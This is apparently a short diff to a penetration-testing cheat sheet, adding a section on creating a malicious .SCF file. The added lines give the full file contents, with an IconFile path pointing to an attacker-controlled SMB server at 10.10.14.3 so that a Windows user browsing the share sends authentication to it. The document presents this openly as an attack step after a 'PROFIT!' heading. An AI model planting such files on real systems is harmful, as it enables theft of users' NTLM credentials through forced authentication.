@@ -44,3 +44,12 @@
 
 #### 8) PROFIT!
 
+#### .SCF File
+
+#### 1) Create an .scf file that points to your SMB server
+
+#### [Shell]
+#### Command=2
+#### IconFile=\\10.10.14.3\share\pwn.ico
+#### [Taskbar]
+#### Command=ToggleDesktop
